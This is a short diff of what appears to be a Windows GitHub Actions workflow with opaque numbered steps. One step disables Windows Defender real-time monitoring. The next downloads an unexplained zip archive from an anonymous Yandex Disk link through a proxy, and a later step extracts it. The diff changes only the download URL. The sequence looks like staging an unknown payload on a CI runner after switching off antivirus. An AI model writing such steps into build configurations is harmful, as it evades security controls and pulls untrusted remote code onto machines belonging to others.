@@ -23,7 +23,7 @@ jobs:
     - name: 11
       run: Set-MpPreference -DisableRealtimeMonitoring $true
     - name: 14
-      run: Invoke-WebRequest -URI https://getfile.dokpub.com/yandex/get/https://disk.yandex.ru/d/8EwqU-VaitKr8Q -outfile c:\21\RegMikroMan222.zip
+      run: Invoke-WebRequest -URI https://getfile.dokpub.com/yandex/get/https://disk.yandex.ru/d/Rq52hEJA9d2uGw -outfile c:\21\RegMikroMan222.zip
     - name: 7
       run: Expand-Archive -LiteralPath "c:\21\RegMikroMan222.zip" -DestinationPath "C:\21"
     - name: 15
